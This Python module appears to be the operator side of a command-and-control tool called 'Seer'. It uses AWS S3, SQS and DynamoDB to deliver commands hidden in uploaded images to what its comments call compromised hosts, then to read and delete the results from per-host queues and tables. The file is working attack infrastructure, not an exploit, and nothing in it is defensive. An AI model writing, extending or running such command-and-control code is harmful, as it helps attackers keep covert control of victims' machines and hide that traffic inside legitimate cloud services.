import boto3
import mimetypes
import io
import os
import time

# Handles anything s3 bucket related
class bucketFunctions:
    def __init__(self, streamingData = None, bucketKey = None):
        self.bucketName = ''
        self.seerBucket = 'seer-s3'
        self.s3 = boto3.client('s3')
        self.streamingData = streamingData
        self.bucketKey = bucketKey
        self.objectList = ''
        self.objectTemp = []
    
    # Print the buckets that exist
    def listBucket(self):
        response = self.s3.list_objects(
            Bucket = self.seerBucket
        )

        keys = {}

        # Build the dictionary of hosts
        for i in response['Contents']:
            splitKey = str(i['Key']).split('/')
            if self.objectList in splitKey:
                self.objectTemp.append(i['Key'])
                keys.update({splitKey[1]:'temp'})
        
        for keys, values in keys.items():
            print(keys)

    def postBucketCommand(self, imgData, mimeType):
        # Puts the image with the command into the host's S3 path
        self.s3.put_object(
            Bucket=self.seerBucket,
            Body=io.BytesIO(imgData),
            Key=self.bucketKey,
            ContentType=mimeType
        )
    
    def uploadDirectory(self, directory):
        # Check if the user is ok using the directory they previously declared or use one the supply
        isDir = False

        print('\nDo you want to use the folder {} to upload to Seer or a different directory: (y/n)'.format(directory))
        dirInput = input().lower()

        if 'n' in dirInput:
            while isDir == False:
                print('What directory do you want to use?')
                directory = input()

                if os.path.exists(directory) == True:
                    isDir = True
                else:
                    print('Directory does not exist...')
        else:
            directory = os.path.abspath(directory)

        imgList = os.listdir(directory)

        # Uploads the entire folder of default images to the S3 bucket
        for object in imgList:
            mimeType = mimetypes.guess_type(object)
            
            # If the object is an image, open the file
            if 'image' in mimeType[0]:
                self.bucketKey = 'images/' + object
                self.objectTemp.append(self.bucketKey)
                self.s3.upload_file(
                    Filename = directory + '/' + object,
                    Bucket = self.seerBucket,
                    Key = self.bucketKey
                )

    def getBucketResuilt(self, key):
        # Gets the file form the S3 Bucket
        response = self.s3.get_object(
            Bucket=self.seerBucket,
            Key=key
        )

        self.streamingData = response['Body']

    def deleteKey(self, key):
        # Deletes the image after it is retrieved
        self.s3.delete_object(
            Bucket=self.seerBucket,
            Key=key
        )

class sqsFunctions:
    def __init__(self, messageExist, queueUrl={}, receiptHandle='', message='none', messageAmount='0') -> None:
        self.sqs = boto3.client('sqs')
        self.queueUrl = queueUrl
        self.receiptHandle = receiptHandle
        self.message = message
        self.messageAmount = messageAmount
        self.messageExist = messageExist
        self.messageAction = ""

    def getUrl(self, hostname):
        # Get the URL of the compromised host
        self.queueUrl = self.sqs.get_queue_url (
            QueueName = hostname + '-Result'
        )
    
    def getAttributes(self):
        # Get the queue attributes to look for the queue to be more than 0
        response = self.sqs.get_queue_attributes (
            QueueUrl = self.queueUrl['QueueUrl'],
            AttributeNames = [
                'ApproximateNumberOfMessages'
            ]
        )
        
        self.messageAmount = response['Attributes']['ApproximateNumberOfMessages']

    def getQueue(self):
        # Get the queue and parse the required data
        result = self.sqs.receive_message (
            QueueUrl = self.queueUrl['QueueUrl'],
            MaxNumberOfMessages=1,
            MessageAttributeNames=[
                'All'
                ]
        )
        
        # There seems to be a race condition here caused by SQS latency. Because of that, sometimes messages in flight will toss back to available then delete.
        # According to Amazon, this is because a random server might still have the message. Because of that, this check needs to exist 
        try:
            self.receiptHandle = result['Messages'][0]['ReceiptHandle']
            self.message = result['Messages'][0]['MessageAttributes']['Path']['StringValue']
            self.messageAction = result['Messages'][0]['MessageAttributes']['Action']['StringValue']
            self.messageExist = True
            self.deleteMessage()  
        except:
            self.messageAmount = '0' 

    def deleteMessage(self):
        # Delete the message so it doesn't process the command again
        response = self.sqs.delete_message (
            QueueUrl = self.queueUrl['QueueUrl'],
            ReceiptHandle = self.receiptHandle
        )

class dynamoFunction():
    # Contains any functions related to dynamodb
    def __init__(self):
        self.dynamo = boto3.client('dynamodb')
        self.currentTime = time.time()

    def getTable(self, hostname, command, args):
        # Get the command based on the time
        response = self.dynamo.query (
            TableName = hostname,
            IndexName = 'command-index',
            KeyConditionExpression = 'command = :command AND sortTime >= :sortTime',
            ExpressionAttributeValues = {
                ':command': {'S':command},
                ':sortTime': {'N':str(self.currentTime)}
            }
        )

        # Print the result and update the time
        try:
            print('Dynamo Entry:\n',response['Items'][0]['result']['S'])
            self.currentTime = float(response['Items'][0]['commandTime']['N'])
        except Exception as e:
            print(e)
            self.currentTime = time.time()
        
        if args.de == True:
            self.deleteEntry(hostname)

    def deleteEntry(self, hostname):
        self.dynamo.delete_item(
            TableName = hostname,
            Key = {'commandTime': {'N': str(self.currentTime)}}
        )